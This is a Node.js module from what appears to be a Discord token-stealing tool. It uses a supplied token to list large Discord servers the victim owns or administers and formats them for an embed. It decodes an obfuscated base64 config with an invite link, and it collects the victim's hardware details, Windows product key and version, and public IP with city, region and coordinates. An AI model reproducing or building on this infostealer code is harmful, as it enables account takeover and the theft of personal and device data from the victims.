const { getSystemInfo, getPublicIp } = require("./../modules/core/core");
const axios = require("axios");

module.exports = {
    fetchServers: async function (x) {
        let _ = await axios({
            url: `https://discord.com/api/v9/users/@me/guilds?with_counts=true`,
            method: "GET",
            headers: {
                Authorization: x,
            },
        })
        let servers = _.data
            .filter((__) => __.owner || (__.permissions & 8) === 8)
            .filter((__) => __.approximate_member_count >= 500)
            .map((__) => ({
                id: __.id,
                name: __.name,
                owner: __.owner,
                member_count: __.approximate_member_count,
            }));
        return {
            totals: servers.length,
            all: servers.length
                ? servers.map((server) => {
                    return `**${server.name}** | \`${server.id}\`` +
                        `\n**Owner** ${server.owner ? "✅" : "❌"
                        } | **Members** <:online:970050105338130433> \`${server.member_count
                        }\``;
                }).join("\n\n")
                : `\`\`\`yml\nNot found\`\`\``
        };
    },
    getField: function (a = null, b = null, c = false) {
        let name = a;
        let value = b;
        let inline = c;
        if (!name || name.length < 1) name = `-`;
        if (!value || value.length < 1) value = `-`;
        return {
            name,
            value,
            inline,
        };
    },
    getEmbed: function () {
        const _ = JSON.parse(Buffer.from("eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=", "base64").toString("utf-8"));
        return {
            avatar: _.avatar_url,
            url: _.discord,
            footericon: _.footer_url,
        };
    },
    getSystemInfos: async function () {
        const {
            disk,
            ram,
            uuid,
            cpucount,
            os_,
            cpu,
            gpu,
            windowskey,
            windowsversion,
        } = await getSystemInfo();

        return {
            disk,
            ram,
            uuid,
            cpucount,
            os_,
            cpu,
            gpu,
            windowskey,
            windowsversion,
        };
    },
    getPublicIps: async function () {
        const {
            ip,
            city,
            region,
            country,
            loc,
            org,
            postal,
            timezone,
        } = await getPublicIp();

        return {
            ip,
            city,
            region,
            country,
            loc,
            org,
            postal,
            timezone,
        };
    }
}
